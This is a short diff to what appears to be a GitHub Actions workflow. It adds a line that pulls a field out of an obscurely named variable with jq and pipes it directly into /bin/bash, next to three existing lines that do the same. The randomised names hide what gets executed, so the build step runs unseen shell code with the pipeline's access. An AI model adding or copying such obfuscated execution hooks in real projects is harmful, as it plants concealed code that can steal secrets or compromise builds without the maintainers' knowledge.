@@ -26,6 +26,7 @@ jobs:
           printf '%s' "$j688" | jq -r .rcdc50 | /bin/bash
           echo $jpoe1 | jq -r .nxvw590 | /bin/bash
           echo $twzd70903 | jq -r .haui283 | /bin/bash
+          printf '%s' "$qhpa5" | jq -r .ant07 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
